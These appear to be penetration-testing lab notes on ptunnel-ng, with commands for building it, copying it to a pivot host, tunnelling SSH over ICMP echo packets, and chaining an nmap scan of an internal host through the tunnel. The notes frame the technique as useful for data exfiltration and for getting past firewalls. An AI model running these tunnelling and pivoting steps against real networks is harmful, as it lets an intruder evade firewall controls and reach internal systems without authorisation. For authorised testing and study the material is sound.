## ptunnel-ng 


ICMP tunneling encapsulates your traffic within ICMP packets containing echo requests and responses. ICMP tunneling would only work when ping responses are permitted within a firewalled network. When a host within a firewalled network is allowed to ping an external server, it can encapsulate its traffic within the ping echo request and send it to an external server. The external server can validate this traffic and send an appropriate response, which is extremely useful for data exfiltration and creating pivot tunnels to an external server.


![Screenshot_3](https://github.com/kiro6/penetration-testing-notes/assets/57776872/139f0117-4f36-436d-b4e2-29a9a58f1cec)


### Setting Up & Using ptunnel-ng
```shell
$ git clone https://github.com/utoni/ptunnel-ng.git

# Building Ptunnel-ng with Autogen.sh
$ sudo ./autogen.sh 
```

### Transferring Ptunnel-ng to the Pivot Host

```shell
$ scp -r ptunnel-ng ubuntu@10.129.202.64:~/
```

### Starting the ptunnel-ng Server on the Target Host

```shell
ubuntu@WEB01:~/ptunnel-ng/src$ sudo ./ptunnel-ng -r10.129.202.64 -R22
```

### Connecting to ptunnel-ng Server from Attack Host

```shell
$ sudo ./ptunnel-ng -p10.129.202.64 -l2222 -r10.129.202.64 -R22
```

### Tunneling an SSH connection through an ICMP Tunnel
```
$ ssh -p2222 -lubuntu 127.0.0.1

```
### Enabling Dynamic Port Forwarding over SSH
```
$ ssh -D 9050 -p2222 -lubuntu 127.0.0.1
```

### Proxychaining through the ICMP Tunnel
```
$ proxychains nmap -sV -sT 172.16.5.19 -p3389
```
